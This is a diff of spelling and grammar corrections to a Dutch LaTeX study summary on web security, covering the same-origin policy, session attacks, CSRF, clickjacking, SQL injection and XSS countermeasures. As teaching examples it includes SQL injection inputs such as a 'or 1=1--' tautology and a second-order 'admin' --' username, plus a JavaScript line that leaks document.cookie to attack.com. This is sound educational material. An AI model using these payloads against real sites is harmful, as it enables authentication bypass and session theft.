@@ -32,7 +32,7 @@ Het protocol voorzien verschillende methoden waarvan er slecht twee veelgebruikt
 De \textit{requests} kunnen een vari\"eteit aan headers bevatten, waarvan de meeste veiligheidsgerelateerd.
 
 \subsubsection{HTTPS}
-Het Hypertext Transfer Protocol biedt zelfs geen beveiligde communicatie aan. Het HTTPS schema gebruikt HTTP bovenop het SSL/TLS protocol. Dit is een gestandaardiseerd transport layer protocol dat een veilige verbinding aanbiedt. Dit protocol is in grote mate configureerbaar waardoor de veiligheidsgaranties hier sterk afhankelijk van zijn.
+Het Hypertext Transfer Protocol biedt zelf geen beveiligde communicatie aan. Het HTTPS schema gebruikt HTTP bovenop het SSL/TLS protocol. Dit is een gestandaardiseerd transport layer protocol dat een veilige verbinding aanbiedt. Dit protocol is in grote mate configureerbaar waardoor de veiligheidsgaranties hier sterk afhankelijk van zijn.
 \begin{itemize}
 	\item Gewoonlijk: integriteit en vertrouwelijkheid van communicatie
 	\item Soms: authentificatie van de server
@@ -50,22 +50,22 @@ Er bestaat verschillende mogelijkheden tot authenticatie:
 \begin{itemize}
 	\item \textbf{Basic HTTP Authenticatie} Een gebruikersnaam en paswoord worden meegestuurd in de header met een request.
 	\item \textbf{Applicatie-level authenticatie} Aan de hand van een \textit{form} worden gebruikersnaam en wachtwoord doorgestuurd naar de server. Optimaal gebeurt dit via HTTPS.
-	\item \textbf{Single-Sing-On} Ondersteunen van een enkelvoudige combinatie van gebruikersnaam en wachtwoord voor meerdere webapplicaties.
+	\item \textbf{Single-Sign-On} Ondersteunen van een enkelvoudige combinatie van gebruikersnaam en wachtwoord voor meerdere webapplicaties.
 \end{itemize}
 
 \subsection{De browser}
-De browser toont HTML en voert \textit{JavasSript} code uit. Het handelt gebruikersevenement en netwerkevenement af. Daarnaast biedt het een krachtige API aan voor scripts:
+De browser toont HTML en voert \textit{JavaSript} code uit. Het handelt gebruikers- en netwerk-gebeurtenissen af. Daarnaast biedt het een krachtige API aan voor scripts:
 \begin{multicols}{2}
 \begin{itemize}
 	\item Inspecteren en aanpassen van de pagina
 	\item Inspecteren en aanpassen van metadata
 	\item Zenden en ontvangen van HTTP
-	\item Afhandelen van evenementen
+	\item Afhandelen van gebeurtenissen
 \end{itemize} 
 \end{multicols}
 
 \section{Bedreigingsscenario's}
-Daar het web een complex applicatieplatform vorm en er verschillende belanghebbende zijn beteken veiligheid iets verschillend voor elke belanghebbende. Tegenmaatregelen doen veronderstellingen met betrekking tot welke stakeholders kwaadaardig zijn en welke niet. In dit onderdeel worde enkele veelvoorkomende aanvallen beschreven.
+Daar het web een complex applicatieplatform vormt en er verschillende belanghebbenden zijn betekent veiligheid iets verschillend voor elke belanghebbende. Tegenmaatregelen doen veronderstellingen met betrekking tot welke stakeholders kwaadaardig zijn en welke niet. In dit onderdeel worden enkele veelvoorkomende aanvallen beschreven.
 
 \subsection{Scenario's}
 Een overzicht van de scenario's
@@ -92,20 +92,20 @@ De remedie tegen deze aanval is het afdwingen van de \textbf{same-origin-policy 
 	\item Scripts kunnen enkel aan informatie die afkomstig is van dezelfde oorsprong als het script. 
 	\item Een oorsprong wordt weergegeven als een triplet:  \texttt{<scheme, address, port>}
 	\item De HTML inhoud hoort bij de origin vanwaar het was gedownload.
-	\item Scripts horen tot de origin van het HTML document dat hun bevatte.
+	\item Scripts horen tot de origin van het HTML document waardoor ze geladen zijn.
 \end{itemize} 
-Deze techniek bescherm websites tegen kwaadaardige scripts van kwaadaardige websites die gelijktijdig geopend zijn in de browser. 
+Deze techniek beschermt websites tegen kwaadaardige scripts van kwaadaardige websites die gelijktijdig geopend zijn in de browser. 
 \\\\
-Deze techniek is echter niet perfect. Door entiteiten in het DOM kan een script een HTTP request starten bij een andere server. Wanneer de browser geprivilegieerde toegang heeft tot een server kan deze worden misbruikt door de aanvaller. Zo kan een script bijvoorbeeld toegang verkrijgen tot servers achter een firewall. Een ander voorbeeld is wanneer een gebruiker een geautoriseerde sessie heeft met een andere server en een script hierdoor geautoriseerde requests kan sturen. Een andere aanvalsmethode bestaat erin event-handlers te overloaden en zo te achterhalen of een server bestaat of beschikbaar is voor de gebruiker.
+Deze techniek is echter niet perfect. Door entiteiten in het DOM kan een script een HTTP request starten bij een andere server. Wanneer de browser geprivilegieerde toegang heeft tot een server kan deze worden misbruikt door de aanvaller. Zo kan een script bijvoorbeeld toegang verkrijgen tot servers achter een firewall. Een ander voorbeeld is wanneer een gebruiker een geautoriseerde sessie heeft met een andere server en een script hierdoor geautoriseerde requests kan sturen. Een andere aanvalsmethode bestaat er in event-handlers te overloaden en zo te achterhalen of een server bestaat of beschikbaar is voor de gebruiker.
 
 \subsubsection{Kwaadwillige cli\"ent val server aan}
 De tegenmaatregelen voor deze aanval zijn vanzelfsprekend: toegangscontrole en authenticatie uitvoeren op de server. Typische aanvallen zijn SQL injectie, path inject of command inject.
 
 \subsubsection{Aanvaller neust rond op het netwerk}
-De tegenmaatregel hiervoor is gebruik maken van SSL/TLS. Mogelijke aanvallen hierop zijn op hun beurt het aanvallen van de publieke sleutelinfrastructuur, het ssl protocol of doen aan SSL stripping. Dit laatste betekent alle \texttt{https} voorkomens vervangen door \texttt{http} in de brondcode van de gedownloade webpagina.
+De tegenmaatregel hiervoor is gebruik maken van SSL/TLS. Mogelijke aanvallen hierop zijn op hun beurt het aanvallen van de publieke sleutelinfrastructuur, het SSL protocol of doen aan SSL stripping. Dit laatste betekent alle \texttt{https} voorkomens vervangen door \texttt{http} in de broncode van de gedownloade webpagina.
 
 \subsubsection{Injectie van kwaadaardige scripts}
-Een aanvaller kan op verschillende manieren een scrip injecteren:
+Een aanvaller kan op verschillende manieren een script injecteren:
 \begin{itemize}
 	\item Door \textbf{Cross-site scripting (XSS)} door het uitbuiten van kwetsbaarheden vergelijkbaar met SQL injectie.
 	\item Distributie van kwaadaardige advertenties.
@@ -122,10 +122,10 @@ Het tracken van sessies gebeurt doorgaans met cookies. Het authenticatieniveau i
 \subsubsection{Session Hijacking}
 Session hijacking is een aanval waarbij de aanvaller toegang probeert te krijgen tot de waarde van de sessie-cookie. Dit kan door het netwerk te \textit{sniffen}, door de cookie te stelen aan de hand van een script of door de waarde te gokken. 
 
-Tegenmaatregelen hiervoor bestaan uit het gebruiken van SSL/TLS of een \textit{random number}-generator worden gebruikt. De cookie beschikt ook over een HTTPSonly-flag wat ervoor zorgt dat de cookie steeds wordt versleuteld. 
+Tegenmaatregelen hiervoor bestaan uit het gebruiken van SSL/TLS of een \textit{random number}-generator. De cookie beschikt ook over een HTTPSonly-flag wat ervoor zorgt dat de cookie steeds wordt versleuteld. 
 
 \subsubsection{Session Fixation}
-Bij deze aanval forceert de aanvaller de gebruiker om de sessie-ID van de aanvaller te gebruiken. Een eenvoudige tegenmaatregeln bestaat uit het vervangen van de session-cookie wanneer het niveau van authenticatie verandert.
+Bij deze aanval forceert de aanvaller de gebruiker om de sessie-ID van de aanvaller te gebruiken. Een eenvoudige tegenmaatregel bestaat uit het vervangen van de session-cookie wanneer het niveau van authenticatie verandert.
 
 \subsubsection{Cross-site Request Forgery (CSRF)}
 Deze aanval bestaat uit een aanvaller die de browser misleidt tot het injecteren van een request in een geautoriseerde sessie. Dit kan a.d.h.v scripting of het insluiten van een niet-lokale resources. Tegenmaatregelen bestaan uit het gebruiken van een geheim token en het strikt nakijken van de \textit{origin header}. Tenslotte bestaan er ook oplossing langs de kant van de cli\"ent zoals \textit{CsFire}.
@@ -141,7 +141,7 @@ Deze aanval bestaat uit een aanvaller die de browser misleidt tot het injecteren
 De cli\"ent wordt misleid tot het klikken op een knop en link die een request start binnen de geautoriseerde sessie door het plaatsen van een onzichtbare frame over een andere pagina. Tegenmaatregelen zijn \textit{Framebusting Javasript code} of gebruik van de \textit{X-Frame-Options} header. Deze laatste voorziet dat een pagina niet in een frame kan weergegeven worden.
 
 \subsection{SQL injectie}
-De meeste webpagina's geven HTML weer na interactie met een gegevensbank. Deze interactie bestaat doorgaans uit SQL queries die (deels) worden gevormd aan de hand van gebruikersinvoer. Een SQL injectie is een aanval waarbij de gebruiker erin slaagt zo'n invoer te voorziend at het effect van SQL querie verandert. 
+De meeste webpagina's geven HTML weer na interactie met een gegevensbank. Deze interactie bestaat doorgaans uit SQL queries die (deels) worden gevormd aan de hand van gebruikersinvoer. Een SQL injectie is een aanval waarbij de gebruiker erin slaagt zo'n invoer te voorzien dat het effect van SQL query verandert. 
 \\\\
 Elke invoer gebruikt door de webapplicatie die kan gemanipuleerd worden door de aanvaller is een mogelijke plaats voor injectie.
 \begin{itemize}
@@ -160,7 +160,7 @@ Elke invoer gebruikt door de webapplicatie die kan gemanipuleerd worden door de 
 	\item Registreer als een gebruiker met de naam \texttt{admin' --}.
 	\begin{itemize}
 		\item Op dit moment is er nog geen sprake van injectie. De naam is correct opgeslagen in de database.
-		\item Veronderstel nu dat het aanpassen van wachtwoorden gebeurd zoals in de listing hieronder.
+		\item Veronderstel nu dat het aanpassen van wachtwoorden gebeurt zoals in de listing hieronder.
 	\end{itemize}
 	\item Als we nu ons wachtwoord aanpassen krijgen we een nieuwe query zoals hieronder.
 \end{enumerate}
@@ -189,7 +189,7 @@ De aanvaller kan verschillende doelen hebben:
 \paragraph{Tautologie} Door het invoeren van \texttt{` or 1=1--} krijgen we onderstaande query met als resultaat dat de authenticatie slaagt.
 \begin{lstlisting}[caption=Tautologie]
 SELECT accounts FROM users WHERE
-login=`` or 1=1 -- AND pass=`` and pin=
+login=`` or 1=1 --` AND pass=`` and pin=
 \end{lstlisting}
 
 \paragraph{Illegal / logically incorrect queries} Door een foutieve query te vormen krijgen we een error bij diens uitvoer. Neem als invoer
@@ -229,7 +229,7 @@ Tegenmaatregelen kunnen worden genomen in de drie fasen van de ontwikkelingscycl
 Voorbeelden van dergelijke programma's zijn \textit{Fortify Source Code Analyzer}, \textit{FindBugs}, \textit{Coverity Static Analysis}. Deze software kan echter slachtoffer worden van \textit{false-positives} en \textit{false-negatives}.
 
 \subsection{Scripts}
-Hoewel de \textbf{SOP} voorkomt dat script rechtstreeks verbinding maken met server van de aanvaller kunnen script toch entiteiten aan de webpagina toevoegen die leiden tot een HTTP request naar een script-specifieke server. Als voorbeeld zien we hieronder hoe een script een cookie kan lekken naar een andere server.
+Hoewel de \textbf{SOP} voorkomt dat script rechtstreeks verbinding maken met een server van de aanvaller kunnen script toch entiteiten aan de webpagina toevoegen die leiden tot een HTTP request naar een script-specifieke server. Als voorbeeld zien we hieronder hoe een script een cookie kan lekken naar een andere server.
 \begin{lstlisting}[caption=Javascript code om cookie te lekken]
 new Image().src = "http://attack.com/?=" + document.cookie;
 \end{lstlisting}
@@ -247,8 +247,8 @@ Deze twee zullen de meeste aanvallen kunnen stoppen. Toch zijn bijkomende tegenm
 
 \begin{itemize}
 	\item Defensief programmeren aan de serverzijde om zich te beschermen tegen \textit{XSS} kwetsbaarheden.
-	\item  De \textbf{Content Security Policy} is een nieuwe \textit{W3C} standaard die toelaat aan de eigenaar van de pagina om te declareren waar de cli\"en verwacht wordt inhoud op te halen. 
-	\item \textbf{Sandboxing} van JavaScript code beperkt de mogelijhkheden van een script aan de hand van een beleid dat door de programmeur is gespecificeerd.
+	\item  De \textbf{Content Security Policy} is een nieuwe \textit{W3C} standaard die toelaat aan de eigenaar van de pagina om te declareren waar de cli\"ent verwacht wordt inhoud op te halen. 
+	\item \textbf{Sandboxing} van JavaScript code beperkt de mogelijkheden van een script aan de hand van een beleid dat door de programmeur is gespecificeerd.
 	\item \textbf{Information flow security} beperkt de stroom van informatie door scripts van gevoelige bronnen naar publieke servers.
 \end{itemize}
 
